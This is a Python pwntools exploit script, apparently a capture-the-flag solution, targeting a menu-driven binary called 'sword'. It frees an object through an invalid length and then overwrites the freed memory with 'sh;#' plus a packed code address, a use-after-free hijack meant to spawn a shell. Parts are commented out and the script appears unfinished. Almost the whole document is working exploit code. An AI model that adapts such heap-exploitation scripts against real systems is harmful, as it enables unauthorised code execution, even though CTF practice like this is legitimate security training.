from pwn import *
import struct

def pack(x):
    return struct.pack("I", x)

def get_menu():
    return r.recvuntil("7. Quit.").strip()

def get_line():
    return (r.recvline().strip())

r = process(["./ld-linux-x86-64.so.2", "./sword"], env={"LD_PRELOAD": "./libc.so.6"})
libc = ELF("./libc.so.6")
# r = process("./a.out")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
system = libc.symbols["printf"]

get_menu()

# Make swords
r.sendline("1")
get_menu()

r.sendline("1")
get_menu()

# # Harden dummy sword
# r.sendline("5")
# get_line()
# r.sendline("0")
# get_line()
# r.sendline("4")
# get_line()
# r.sendline("sh;#")
# get_line()
# r.sendline("-1")
# get_menu()

# Show it
r.sendline("3")
get_line()
r.sendline("0")
get_menu()

# Free it illegitimately
r.sendline("5")
get_line()
r.sendline("0")
get_line()
r.sendline("4097")
get_menu()

# Harden "shell" sword
name = "sh;#" + pack(0x400b9d)
r.sendline("5")
get_line()
r.sendline("1")
get_line()
r.sendline(str(len(name)))
get_line()
r.sendline(name)
get_line()
r.sendline("-1")
get_menu()

# Synthesize
r.sendline("2")
get_line()
r.sendline("1")
get_line()
r.sendline("0")
get_menu()

# # Show
# r.sendline("3")
# get_line()
# r.sendline("0")
# get_menu()

# Show it
r.sendline("3")
get_line()
r.sendline("1")
print(repr(get_menu()))

# # Equip!
# r.sendline("6")
# get_line()
# r.sendline("0")
# print(get_menu())

# r.sendline("1")
# r.interactive()
